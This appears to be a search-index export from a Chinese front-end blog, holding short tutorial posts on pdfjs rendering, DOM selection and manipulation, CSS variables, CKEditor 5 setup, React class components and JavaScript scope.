關於讀檔案的部分其實會牽扯到蠻多東西的，所以我不打算解釋太深，你只要知道每一步大概在做什麼就好了： 使用者上傳檔案後，用 event.target.files 拿到的會是「blob」格式的物件，我們不能直接把這個丟給 pdfjs 來解析，所以要先做一些處理。 利用 FileReader.readAsArrayBuffer 來讀取 blob 後，會拿到一個「ArrayBuffer」的資料。ArrayBuffer 是一種比較特別的物件，他的內容會指向某個記憶體位址（類似 C 的 Pointer），但重點是只能讀不能寫，所以必須在透過一個叫做「View」的一種資料型態來操作 ArrayBuffer（這一段真的比較抽象，所以可能要多在自己參考其他文章來想想看，像 這篇 我覺得解釋得還蠻好理解的）。 為了透過 View 來操作 ArrayBuffer，必須用 new Uint8Array(fileReader.result as ArrayBuffer) 來產生一個 View，而 View 在 JavaScript 中是屬於一種叫做「TypedArray」的資料型態，所以才會以此來當作變數名稱。 最後把這個「可操作的資料」丟給 pdfjs 後，就可以順利的讀取並渲染到 canvas 上。 雖然以這邊的例子來說，就算你直接把 ArrayBuffer 丟給 pdfjs 也可以正常渲染，但官方建議透過這種方式來減少「memory leak」 的問題。","link":"/2022/11/19/canvas-render-pdf/"},{"title":"DOM 冷知識－在一個範圍內找出元素","text":"這個真的不知道。 簡述原本以為元素都只能這樣子找： 123456789101112131415&lt;div class=\"block\"&gt; &lt;input type=\"text\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt; &lt;input type=\"text\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt; &lt;input type=\"text\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt; &lt;input type=\"text\"&gt;&lt;/div&gt; JavaScript： 123456789const input1 = document.querySelectorAll('input[type=text]')[0]const input2 = document.querySelectorAll('input[type=text]')[1]const input3 = document.querySelectorAll('input[type=text]')[2]const input4 = document.querySelectorAll('input[type=text]')[3]console.log(input1)console.log(input2)console.log(input3)console.log(input4) 其實可以把範圍縮小這樣子做其實也可以： 1234567// 取得所有 .block 元素const blocks = document.querySelectorAll('.block')// 遍歷每個 .block 元素// （注意是 Array-like-object 所以才能用 for..of）for (let block of blocks) { console.log(block.querySelector('input[type=text]')) } 這樣子的搜索範圍就會是： blocks[0] 下面的第一個 &lt;input&gt; blocks[1] 下面的第一個 &lt;input&gt; blocks[2] 下面的第一個 &lt;input&gt; 以此類推 所以其實你平常用 document.querySelector 的意思是「document 下面的第一個 &lt;input&gt;」 這是一個仔細想想會覺得很合理，但平常卻都沒發現的事情，太有趣了！","link":"/2022/01/20/catch-element-in-a-range/"},{"title":"用 DOM 選到想要的元素","text":"選我選我選我。 列表備註： HTMLCollection 和 NodeList 都是 array-like-object 注意 Element 有 S 跟沒有 S 的差別，有 S 通常代表陣列（多個結果） getElementsByTagName(tagName) 回傳「陣列」結果 12const element = document.getElementsByTagName('div')console.log(element) // HTMLCollection(2)&nbsp;[div, div] getElementById(id) 回傳「節點」（id 只會有一個） 12const element = document.getElementById('yo')console.log(element) // &lt;div id=\"hi\"&gt;yoyoyo&lt;/div&gt; getElementsByClassName(className) 回傳「陣列」結果 12const element = document.getElementsByClassName('block')console.log(element) // HTMLCollection(2)&nbsp;[div.block, div.block] querySelector(selector) 回傳第一個找到的「節點」 備註：注意參數是 「css selector」 12const element = document.querySelector('.block')console.log(element) // &lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; querySelectorAll(selector) 回傳所有符合結果的「陣列」 備註：注意參數是 「css selector」 12const element = document.querySelectorAll('.block')console.log(element) // NodeList(2)&nbsp;[div.block, div.block] element.childNodes 取出所有子節點（注意文字跟註解節點） 1234567&lt;div class=\"block\"&gt; &lt;p&gt;123&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt;&lt;/div&gt; 1234const parent = document.querySelector('.block')const childrens = parent.childNodesconsole.log(childrens)// NodeList(7)&nbsp;[text, p, comment, text, p, comment, text, p, text] element.firstChild 取出第一個子節點（注意文字跟註解節點） 12345678&lt;div class=\"block\"&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;123&lt;/p&gt;&lt;/div&gt; 1234const parent = document.querySelector('.block')const commentNode = parent.firstChild // #textconst commentNode = parent.firstChild.nextSibling // #commentconst p = parent.firstChild.nextSibling.nextSibling.nextSibling // &lt;p&gt; element.firstElementChild 取出第一個「元素」子節點（不會選到文字或註解節點） 1234&lt;div id=\"foo\"&gt; &lt;!-- This comment won't be selected --&gt; &lt;span&gt;Hello&lt;/span&gt;&lt;/div&gt; 12console.log(document.getElementById('foo').firstElementChild)// &lt;span&gt;...&lt;/span&gt; element.lastElementChild 取出第一個「元素」子節點（不會選到文字或註解節點） 1234&lt;div id=\"foo\"&gt; &lt;span&gt;Hello&lt;/span&gt; &lt;p&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; 12console.log(document.getElementById('foo').lastElementChild)// &lt;p&gt;...&lt;/p&gt; element.closest(selector) 找到「上層第一個」符合選取器的父元素 123456&lt;ul&gt; &lt;li&gt;&lt;a href=\"#\"&gt;abc&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;abc&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;abc&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;abc&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 12const parent = document.querySelector('a').closest('li')console.log(parent) // 第一個 &lt;li&gt; element.parentNode 找到父元素 12const parent = document.querySelectorAll('li')[3].parentNodeconsole.log(parent) // &lt;ul&gt; getElementsByName 透過 name 的值來取得元素（陣列） 12345678&lt;div class=\"block\"&gt; &lt;p name=\"gender\"&gt;123&lt;/p&gt; &lt;p name=\"gender\"&gt;123&lt;/p&gt; &lt;p name=\"gender\"&gt;123&lt;/p&gt; &lt;input type=\"radio\" name=\"gender\" /&gt; &lt;input type=\"radio\" name=\"gender\" /&gt; &lt;input type=\"radio\" name=\"gender\" /&gt;&lt;/div&gt; 12console.log(document.getElementsByName('gender'))// NodeList(6)&nbsp;[p, p, p, input, input, input]","link":"/2022/01/18/catch-element-methods/"},{"title":"用 JavaScript 改變 CSS 的變數","text":"懶人包。 簡述先建立好 CSS 變數： 1234:root { --mouse-x: 0px; --mouse-y: 0px;} 12345.box { position: absolute; top: var(--mouse-y); left: var(--mouse-x);} 12345const root = document.documentElementroot.addEventListener('mousemove', (e) =&gt; { root.style.setProperty('--mouse-x', e.clientX + 'px') root.style.setProperty('--mouse-y', e.clientY + 'px')}) 就這樣完成囉！","link":"/2022/01/29/change-css-variable-value/"},{"title":"用 DOM 改變元素的 Class","text":"懶人包系列。 新增或移除 ClassList備註：既然 classList 都叫 List 了，就代表可以想成是一個陣列，他不會把整筆 Class 覆寫掉。 新增單個HTML： 1&lt;div&gt;yoyoyo&lt;/div&gt; JavaScript： 12const element = document.getElementsByTagName('div')[0]element.classList.add('block') Output： 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; 新增多個HTML： 1&lt;div&gt;yoyoyo&lt;/div&gt; JavaScript： 12const element = document.getElementsByTagName('div')[0]element.classList.add('block', 'inline-block') Output： 1&lt;div class=\"block inline-block\"&gt;yoyoyo&lt;/div&gt; 移除單個HTML： 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; JavaScript： 12const element = document.querySelector('.block')element.classList.remove('block') Output： 1&lt;div&gt;yoyoyo&lt;/div&gt; 移除多個HTML： 1&lt;div class=\"block inline-block\"&gt;yoyoyo&lt;/div&gt; JavaScript： 12const element = document.querySelector('.block')element.classList.remove('inline-block', 'block') Output： 1&lt;div&gt;yoyoyo&lt;/div&gt; 切換 ClassHTML： 12&lt;div class=\"block inline-block\"&gt;yoyoyo&lt;/div&gt;&lt;button&gt;Toggle Class&lt;/button&gt; JavaScript： 12345const element = document.querySelector('.block')document.querySelector('button').addEventListener('click', // 按下按鈕時，切換 class () =&gt; element.classList.toggle('inline-block')) Output： 把整個 Class 覆寫掉 ClassName應該不常用，但可以知道一下。 範例一HTML： 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; JavaScript： 12const element = document.querySelector('.block')element.className = 'override-backgroud' Output： 1&lt;div class=\"override-backgroud\"&gt;yoyoyo&lt;/div&gt; 範例二1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; JavaScript： 12const element = document.querySelector('.block')element.className = 'block override-backgroud' Output： 1&lt;div class=\"block override-backgroud\"&gt;yoyoyo&lt;/div&gt;","link":"/2022/01/18/change-element-class/"},{"title":"用 DOM 改變元素內容","text":"懶人包。 元素中的所有文字 innerText存取文字內容備註：只會顯示文字，不包含「標籤」 HTML： 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScript： 12const element = document.querySelector('.block') // &lt;div class=\"block\"&gt;...&lt;/div&gt;console.log(element.innerText) // yoyoyo I am a span 修改文字內容備註：如果內容有「標籤」的話會被覆寫掉 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScript： 12const element = document.querySelector('.block')element.innerText = 'blablablabla' Output： 元素中的所有內容 innerHTML備註：所有內容指的就是包含「標籤」 存取內容HTML： 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScript： 12const element = document.querySelector('.block')console.log(element.innerHTML) Output： 12yoyoyo&lt;span&gt;I am a span&lt;/span&gt; 修改內容HTML： 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScript： 12345const element = document.querySelector('.block')element.innerHTML = ` &lt;span&gt;hehehe&lt;/span&gt; &lt;a href=\"#\"&gt;link&lt;/a&gt;` Output： 1234&lt;div class=\"block\"&gt; &lt;span&gt;hehehe&lt;/span&gt; &lt;a href=\"#\"&gt;link&lt;/a&gt;&lt;/div&gt; 包含元素自己的所有內容 outerHTML備註：就跟 inner 一樣，只是現在還包含「元素自己」 存取內容HTML： 1234&lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScript： 12const element = document.querySelector('.block')console.log(element.outerHTML) Output： 1234&lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; 修改內容備註：要修改的元素上層必須有「父元素」才可以，下面能改是因為在測試環境裡面 &lt;div&gt; 的上層有 &lt;body&gt;。 HTML： 1234 &lt;div class=\"block\"&gt; yoyoyo &lt;span&gt;I am a span&lt;/span&gt;&lt;/div&gt; JavaScript： 12345const element = document.querySelector('.block')element.outerHTML = ` &lt;span&gt;hehehe&lt;/span&gt; &lt;a href=\"#\"&gt;link&lt;/a&gt;` Output： 12&lt;span&gt;hehehe&lt;/span&gt;&lt;a href=\"#\"&gt;link&lt;/a&gt; 比 innerHTML 效能更好但比較難懂的 insertAdjacentHTML注意一下第一個參數有四個選項： beforebegin 元素的之前（之前的之前） aftereend 元素的之後（之後的之後） afterbegin 元素裡面的第一個 beforeend 元素裡面的最後一個 （其實英文意思比較好懂） 12345678910111213&lt;ul class=\"beforebegin\"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt;&lt;/ul&gt;&lt;ul class=\"afterbegin\"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt;&lt;/ul&gt; 12345678910// 在選到的元素前面插入 &lt;div&gt;document .querySelector('.beforebegin') .insertAdjacentHTML('beforebegin', '&lt;div&gt;Insert to outside&lt;/div&gt;')// 在選到的元素（裡面）的第一個插入 &lt;li&gt;document .querySelector('.afterbegin') .insertAdjacentHTML('afterbegin', '&lt;li&gt;Insert to inside&lt;/li&gt;')","link":"/2022/01/18/change-element-content/"},{"title":"用 DOM 改變元素的 CSS","text":"寫下來要查比較方便，怕以後又忘了。 示範HTML： 1&lt;div class=\"block\"&gt;yoyoyo&lt;/div&gt; JavaScript： 123456789const element = document.querySelector('.block')element.style.background = 'black'element.style.width = '500px'element.style.margin = '70px auto'element.style.padding = '30px'element.style.color = 'white'element.style.fontSize = '24px'element.style.fontFamily = 'sans-serif'element.style.textAlign = 'center' Output： 備註：這些樣式會寫到「inline-style」中 特別注意到 . 後面的屬性名稱不能出現 -，所以有 - 的 CSS 屬性要改寫成 CamelCase。 但你真的硬要的話還是可以，只是要寫成這樣： 12345678910const element = document.querySelector('.block')// 改背景顏色element.style.background = 'black'element.style.width = '500px'element.style.margin = '70px auto'element.style.padding = '30px'element.style.color = 'white'element.style['font-size'] = '24px'element.style['font-faimily'] = 'sans-serif'element.style['text-align'] = 'center' 不過不建議啦～很難看耶。","link":"/2022/01/18/change-element-style/"},{"title":"CHAR、VARCHAR 和 TEXT 的差異","text":"懶人包系列。 懶人包CHAR： 設定時就要給一個固定長度（如果存的資料長度不夠會自動加上空格） 最大長度是 255 VARCHAR： 當長度 ≤ 255 時拿 1 byte 來存字串的長度，超過就拿 2 byte 最大長度是 65535，可以自己加上長度限制（畢竟都有 var 這個前墜了） 字串長度必須在 1~65535 之間，不可以是空值 查詢速度比較快 TEXT： 會用 2 byte 來存字串的長度 最大長度是 65535，不可以自己加上長度限制 查詢速度比較慢 簡單來說，能用 VARCHAR 就盡量用 VARCHAR，TEXT 比較適合用在不確定資料有多長的欄位。","link":"/2022/02/10/char-varchar-and-text-difference/"},{"title":"檢查一個變數存不存在的正確方式","text":"真神奇。 簡述通常有些人會這樣做： 123if (typeof a !== 'undefined') { console.log(a);} 會這樣做是因為如果直接 if (a !== 'undefined') 的話程式會掛掉，參考這例子： 12console.log(typeof a); // 'undefined'console.log(a) // Uncaught ReferenceError: a is not defined 所以不想要程式掛掉的話就能利用 typeof 來檢查。","link":"/2022/03/06/checking-if-a-variable-exists/"},{"title":"Chorme-devtool 的冷知識","text":"純粹做一點簡單的紀錄。 跟 Network 有關的資訊request header host =&gt; 連到哪個網域 refer =&gt; 從哪邊連過來的？（上個頁面） accept =&gt; 接受哪些格式的 response accept-language =&gt; 偏好語言（有優先度），server 要自己根據偏好語言來實作回傳什麼內容。 user-agent =&gt; 使用者的瀏覽器是哪個，跟一些額外資訊。 X- 開頭的 header 是什麼？應該是 Extension 的意思，簡單來說就是自己額外加上的 「response header」，如果不是 X- 開頭的就代表是「一定要有的 header」。 如果是 POST request你可以在 devetool 打開 payload 來查看 POST 過去的內容是什麼。 冷知識 按下 enter 會直接送出，所以要改成 shift + enter console 中每執行一個指令都會有一個對應的回傳值， &gt; 代表執行的指令，&lt; 代表該指令的回傳值（所以如果你在 console 下的指令沒有回傳值，就會一直看到 undefined） 選到一個 element 後按下 h，Chrome 就會自動幫你加上 display: hide 的 class","link":"/2021/12/20/chorme-devtool/"},{"title":"CKEditor 的使用方法","text":"邊做筆記邊複習。 簡述CKEditor 是一個所見即所得的文字編輯器，主要用途是給使用者編輯文字的環境，例如部落格裡面的編輯文章功能。 CKEditor 目前主要有 4、5 兩個版本，這兩者是不相容的，所以這篇會拿 5 來做教學。 備註 當初踩到的雷在安裝編輯器跟套件的時候要特別注意「版本」，如果套件的版本比編輯器還新，像這樣： 123456789{ \"name\": \"@ckeditor/ckeditor5-build-classic\", \"version\": \"19.0.0\", // -&gt; 編輯器的版本 \"description\": \"The classic editor build of CKEditor 5 – the best browser-based rich text editor.\", \"devDependencies\": { \"@ckeditor/ckeditor5-ckfinder\": \"^19.0.0\", \"@ckeditor/ckeditor5-code-block\": \"^32.0.0\", // -&gt; 套件的版本 \"@ckeditor/ckeditor5-core\": \"^19.0.0\", }, 之後引入的時候就有機會碰到 duplicated modules（模組重複載入）的問題。 引入方式 CDN 引入，如果你沒有安裝擴充套件的需求，那就用這個方式就好： 1&lt;script src=\"https://cdn.ckeditor.com/ckeditor5/32.0.0/classic/ckeditor.js\"&gt;&lt;/script&gt; 下載原始碼 目前有五個版本： classic — the Classic editor inline — the Inline editor balloon — the Balloon editor balloon-block — the Balloon block editor decoupled-document — the Document editor 實際的差別可以去看官方文件，因為我也沒特別去看所以不清楚。 總之，最多人用的是 classic，所以這邊也會拿這個來用。 先到 這邊 下載原始碼： 1git clone https://github.com/ckeditor/ckeditor5.git 備註：現在新版的 CKEditor5 已經整合到一個 Repository 了，不要下載錯版本，像這個就是舊版的：ckeditor5-build-classic。 接著只要根據路徑把 ckeditor.js 引入就 OK 了： 1&lt;script src=\"ckeditor5\\packages\\ckeditor5-build-classic\\build\\ckeditor.js\"&gt;&lt;/script&gt; 啟用方式很簡單，只要這兩段 code 就搞定： 1&lt;textarea name=\"content\" id=\"editor\"&gt;&lt;/textarea&gt; 12345678&lt;script src=\".ckeditor5\\packages\\ckeditor5-build-classic\\build\\ckeditor.js\"&gt;&lt;/script&gt;&lt;script&gt; ClassicEditor .create(document.querySelector('#editor')) .catch(error =&gt; { console.error(error); });&lt;/script&gt; create 會根據 selector 來替換元素，所以不一定要 &lt;textarea&gt;，&lt;div&gt; 也行。 另外這很明顯是個 Promise，所以發生錯誤的話就會執行 catch 區塊，你可以在那邊看錯誤訊息。 一切順利的話你就會看到這個結果： 如果你沒有要安裝其他套件的話，到這邊就差不多了，有需求的話就繼續看下去吧。 安裝擴充功能備註：安裝的方式有兩個，一種是改源碼重新 build，另一種是直接在 JS 裡面插入。這裡介紹的是第一種，如果你對第二種方式有興趣參考這裡。不過要切記，這兩個不可以混用，否則很有可能出問題。 備註：後來發現有更簡單的方式，官方有提供線上打包的服務，可以參考這裡 把原始碼下載下來後，會看到 ckeditor5-build-classic 這個資料夾，這裡說明一下資料結構： 12345678910111213141516171819202122232425│ CHANGELOG.md│ CONTRIBUTING.md│ LICENSE.md│ package.json -&gt; CKEditor 的所有資訊（很重要）│ README.md│├───.github│ PULL_REQUEST_TEMPLATE.md│├───build -&gt; 打包後的檔案│ │ ckeditor.js│ │ ckeditor.js.map│ ││ └───translations │├───sample -&gt; 示範檔案（用這個能看 build 出來的編輯器長怎樣）│ index.html│├───src -&gt; 原始碼（程式的進入點）│ ckeditor.js│└───tests -&gt; 測試的地方 │ ckeditor.js │ └───manual 先說明一下安裝擴充套件的流程： npm install 你要安裝的擴充功能 到 src ckeditor.js 把套件引入跟設定 重新 build 不過在那之前，請務必先： npm install 安裝所有 package.json 中的套件 npm install 安裝所有 package.json 中的套件 npm install 安裝所有 package.json 中的套件 因為它是用 webpack 來打包的，沒有先安裝好的話等一下 build 的時候會出錯。 安裝 Code blocks 套件這邊拿 Code blocks 來當範例。不管安裝哪個套件流程都是一樣的，所以請務必弄懂這個流程。 接著照著文件的安裝說明來做： 12# 在 ckeditor5-build-classic 這個資料夾下npm install --save @ckeditor/ckeditor5-code-block 安裝完後 package.json 就會有紀錄了： 123\"dependencies\": { \"@ckeditor/ckeditor5-code-block\": \"^32.0.0\"} 引入及設定套件接著打開 src 底下的 ckeditor.js，會看到像這樣的內容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// The editor creator to use.import ClassicEditorBase from '@ckeditor/ckeditor5-editor-classic/src/classiceditor';// 引入各種套件import Essentials from '@ckeditor/ckeditor5-essentials/src/essentials';import UploadAdapter from '@ckeditor/ckeditor5-adapter-ckfinder/src/uploadadapter';import Autoformat from '@ckeditor/ckeditor5-autoformat/src/autoformat';import Bold from '@ckeditor/ckeditor5-basic-styles/src/bold';import Italic from '@ckeditor/ckeditor5-basic-styles/src/italic';import BlockQuote from '@ckeditor/ckeditor5-block-quote/src/blockquote';....// build 時要載入的套件ClassicEditor.builtinPlugins = [ Essentials, UploadAdapter, Autoformat, Bold, Italic, BlockQuote, CKFinder, EasyImage, Heading, ...];// 設定編輯器的地方ClassicEditor.defaultConfig = { // 工具列要顯示哪些 item toolbar: { items: [ 'heading', '|', 'bold', 'italic', 'link', ... ] }, // 圖片工具的設定 image: { toolbar: [ 'imageStyle:full', 'imageStyle:side', '|', 'imageTextAlternative' ] }, // 表格工具的設定 table: { contentToolbar: [ 'tableColumn', 'tableRow', 'mergeTableCells' ] }, // This value must be kept in sync with the language defined in webpack.config.js. language: 'en'}; 這邊只要做兩件事情就好： 把剛載好的套件 import 進來 把套件綁到 ClassicEditor.defaultConfig 下 一樣按照官方說明來做： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// The editor creator to use.import ClassicEditorBase from '@ckeditor/ckeditor5-editor-classic/src/classiceditor';// 引入各種套件import Essentials from '@ckeditor/ckeditor5-essentials/src/essentials';import UploadAdapter from '@ckeditor/ckeditor5-adapter-ckfinder/src/uploadadapter';import Autoformat from '@ckeditor/ckeditor5-autoformat/src/autoformat';import Bold from '@ckeditor/ckeditor5-basic-styles/src/bold';import Italic from '@ckeditor/ckeditor5-basic-styles/src/italic';import BlockQuote from '@ckeditor/ckeditor5-block-quote/src/blockquote';// 剛載好的套件import CodeBlock from '@ckeditor/ckeditor5-code-block/src/codeblock';....// build 時要載入的套件ClassicEditor.builtinPlugins = [ Essentials, UploadAdapter, Autoformat, Bold, Italic, BlockQuote, CKFinder, EasyImage, Heading, CodeBlock, // 加進去 ...];// 設定每個套件的預設值ClassicEditor.defaultConfig = { // 工具列要顯示哪些 item toolbar: { items: [ 'heading', '|', 'bold', 'italic', 'link', ... 'codeBlock' // 新增這個按鈕 ] },}; 備註：套件設定的部分建議別動，要改的話去使用 CKEditor 的頁面在改就好。 重新編譯最後一步最簡單啦，下這行指令就好： 1npm run build 最後把編譯完的 ckeditor.js 引入就完成了。 怎麼取得編輯器的內容 PHP 如果你是用 Form 表單來送出內容的話，那你可以在 PHP 裡面拿資料： 1234&lt;form method=\"POST\" action=\"result.php\"&gt; &lt;textarea name=\"content\" id=\"editor\"&gt;&lt;/textarea&gt; &lt;button class=\"btn\"&gt;Send&lt;/button&gt;&lt;/form&gt; 12// result.php$content = $_POST['content']; JavaScript 如果你是透過 AJAX 的話，參考這個做法： 12&lt;textarea name=\"content\" id=\"editor\"&gt;&lt;/textarea&gt;&lt;button class=\"btn\"&gt;send&lt;/button&gt; 123456789101112131415// 先宣告一個變數，等一下要儲存編輯器的實體let editor = undefined;ClassicEditor .create(document.querySelector('#editor')) .then( newEditor =&gt; { // 指定給變數 editor = newEditor }) .catch(error =&gt; { console.error(error); });document.querySelector('.btn').addEventListener('click', () =&gt; { // 這裡就可以用 getData 來取得 HTML 內容 console.log(editor.getData());})","link":"/2022/02/20/ckeditor-usage/"},{"title":"初探 Class-component","text":"初次見面。 簡述可以先比對一下 function component 跟 class component 的差異： 在 function component： 用 return 的東西來渲染內容 在元件中使用的 function 會直接宣告在裡面 設置 state 得透過 useState 更新 state 得透過 useState 回傳的 setter 來做 在 class component： 會用 render 來渲染內容 在元件中使用的 function 會寫成 class 的 method 設置 state 得透過 constructor 的 this.state 更新 state 得透過 this.setState 來傳入新的 state 除了以上，class component 還必須時時刻刻注意 this 值指向誰。 一個基本的 class component 範例這是一個不正確的範例，下面會在做解釋，先看就對了： 1234567891011121314151617181920212223class Demo extends React.Component { // 先把原本 React.Component 的屬性傳進去（像是 setState 或 life cyecle 之類的東西） // 才可以接著寫自己新增的屬性 constructor (props) { super(props) // 只能是 Object this.state = { counter: 0 } } handleClick () { // 傳一個新的 state 進去 this.setState({ // 先拿到原本的 state，再加一 counter: this.state.counter + 1 }) } render() { // 把 method 當作 event handler return (&lt;button onClick={this.handleClick}&gt;{this.state.counter}&lt;/button&gt;) }} 看起來好像還蠻合理的？但是： 會發現怎麼點都沒有用？這就是 this 的問題，我們來一步一步分析看看： this.handleClick 的「值」是一個 function（還沒被執行） 而 handleClick 裡有用到 this，它會根據 handleClick 怎麼被呼叫來決定 event handler 是一個 callback function，瀏覽器幫我們在使用者點下按鈕時呼叫，所以絕對不是由 Component 來呼叫的（這是關鍵點） 因此最後 this 值沒有指向 Component，而是 undefined（嚴格模式） 解決這種 this 跑掉的辦法有兩種： 改用 Arrow function 的形式來宣告 method（背後是透過 babel 轉譯的，不是原生語法） 在 constructor 利用 bind 來綁定 this 值 在 inline function 裡用 Arrow function 包住原本的 method 在 inline function 裡用 bind 來綁定 this 值 先來看第一種的寫法： 1234567891011121314151617181920class Demo extends React.Component { constructor (props) { super(props) // 記得只能是 Object this.state = { counter: 0 } } // 記得要加一個「=」，babel 會幫你自動幫你轉換 handleClick = () =&gt; { this.setState({ counter: this.state.counter + 1 }) } render() { return (&lt;button onClick={this.handleClick}&gt;{this.state.counter}&lt;/button&gt;) }} 接著是第二種作法： 1234567891011121314151617181920class Demo extends React.Component { constructor (props) { super(props) this.state = { counter: 0 } // 讓 this 永遠指向 Component this.handleClick = this.handleClick.bind(this) } handleClick () { this.setState({ counter: this.state.counter + 1 }) } render() { return (&lt;button onClick={this.handleClick}&gt;{this.state.counter}&lt;/button&gt;) }} 接著第三種作法： 123456789101112131415161718class Demo extends React.Component { constructor (props) { super(props) this.state = { counter: 0 } } handleClick () { this.setState({ counter: this.state.counter + 1 }) } render() { return (&lt;button onClick={() =&gt; this.handleClick()}&gt;{this.state.counter}&lt;/button&gt;) }} 這邊用 Arrow function 的形式可能有點難看懂，但寫成這樣你應該就懂了： 1234567render() { return (&lt;button onClick={ function wrapper () { return this.handleClick() } }&gt;{this.state.counter}&lt;/button&gt;)} 就是 onClick 時幫我去呼叫 wrapper，而 wrapper 裡面又會在呼叫 this.handleClick 這樣的概念。但要注意一定要用 arrow function 才可以，不然 this 值一樣會跑掉。 最後是第四種作法： 123456789101112131415161718class Demo extends React.Component { constructor (props) { super(props) this.state = { counter: 0 } } handleClick () { this.setState({ counter: this.state.counter + 1 }) } render() { return (&lt;button onClick={this.handleClick.bind(this)}&gt;{this.state.counter}&lt;/button&gt;) }} 其實就跟第二種差不多，都是透過 bind 來綁定 this 值 在 class component 接收 props 以及父子溝通這邊的技巧就是「哪裡會用到 props，就在哪邊取出」，如果在 render 時會用到，那就在 render 裡面拿；如果在某個 methods 會用到，那就在 methods 裡面拿，以此類推。 我們想做出的效果是這樣： 一個簡單的列表，按一下按鈕就會新增一筆資料。而這裡的元件關係如下： Demo（負責管理資料的 state） Button（按下按鈕時要更新 Demo 裡的 state） Todo（根據 Demo 的 state 渲染列表） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Demo extends React.Component { constructor(props) { super(props); this.state = { todos: [], }; } // 更新 todo 的 state handleAddTodo = (content) =&gt; { this.setState({ todos: [content, ...this.state.todos], }); }; render() { return ( &lt;div id=\"container\"&gt; // 把 function 當作 props 傳入 &lt;Button handleAddTodo={this.handleAddTodo} /&gt; {this.state.todos.map((todo) =&gt; ( // 把 todo 當作 props 傳入 &lt;Todo content={todo} /&gt; ))} &lt;/div&gt; ); }}class Button extends React.Component { handleClick = () =&gt; { // 先把 props 拿出來 const { handleAddTodo } = this.props; // 執行 props 進來的 function handleAddTodo(Math.random()); }; render() { return &lt;button onClick={this.handleClick}&gt;add todo&lt;/button&gt;; }}class Todo extends React.Component { render() { // 渲染會用到，從這邊拿出來 const { content } = this.props; return &lt;div&gt;{content}&lt;/div&gt;; }} 大致上跟 hook 的寫法差不多，只是要特別注意 this 跟拿出來的地方。之所以要在每個用到的地方都取出，是因為在 class 沒辦法這樣寫： 123456789class Button extends React.Component { // 一種 class 裡的全域變數的感覺，但不能這樣寫 const {prop1, prop2, ...prop3} = this.props render () { // 這裡才可以宣告變數 const {prop1, prop2, ...prop3} = this.props ... }} 只有在 method 裡面才能宣告變數，這是一個小細節，要多多注意。 改變 state 時可以不管沒改到的地方假設你有一個 component 的 state 結構長這樣： 12345this.state = { family: ['sister', 'father', 'mother'], age: [10, 20 ,30], totalCount: 3} 然後你可能會想在點下某個按鈕時，新增 family 的部分： 那你會怎麼做？我原本的想法是這樣： 123456handleClick = () =&gt; { this.setState({ ...this.state, family: [...this.state.family, Math.random()] });}; 先複製一份原本的 state，在針對 family 的部分做新增。 但其實不用這麼麻煩，只要這樣就好： 123456handleClick = () =&gt; { this.setState({ family: [...this.state.family, Math.random()] });}; 沒有動到的東西 React 會保留起來，所以不用這麼麻煩唷～ 不過在 hook 就不能這樣做了，一定要給它完整的 state 才行： 12345678910111213141516171819const [data, setData] = useState({ family: [\"sister\", \"father\", \"mother\"], age: [10, 20, 30], totalCount: 3});// 這樣可以const handleClick = () =&gt; { setData({ ...data, family: [...data.family, Math.random()] });};// 這樣不對const handleClick = () =&gt; { setData({ family: [...data.family, Math.random()] });};","link":"/2022/04/08/class-component-first-meet/"},{"title":"先理解作用域跟回傳值，再來談閉包。","text":"突然有一點新的想法。 前言上個月我有寫過一篇：談談 JS 中的 Closure（閉包），但最近又有了一些新想法，所以想在寫一次關於「閉包（Closure）」這個主題。 就跟標題一樣，我覺得閉包沒有那麼複雜，你只要先理解「作用域」、「作用域鏈」跟「回傳值」這三樣東西，我覺得就沒那麼複雜了。 區域作用域與全域作用域簡單來說，作用域就是：一個變數的生存範圍 在 JavaScript 中，必須透過 function 才能建立出作用域： 123456function scope() { var a = 10 console.log(a)}scope() // 10console.log(a) // ReferenceError: a is not defined 這時候我們會說 scope 產生了一個「區域作用域」，而 a 是這個作用域中的「區域變數」。它只有在 scope 中可以被存取，外面沒辦法。所以 a 的生存範圍只在 scope 這個作用域裡面。 那全域作用域呢？很簡單，就是沒有宣告在 function 裡的變數： 123456var a = 10function scope() { console.log(a)}scope() // 10console.log(a) // 10 這時候在哪裡都能存取到 a，因為 a 是「全域變數」，也就是生存範圍是「全域作用域」。 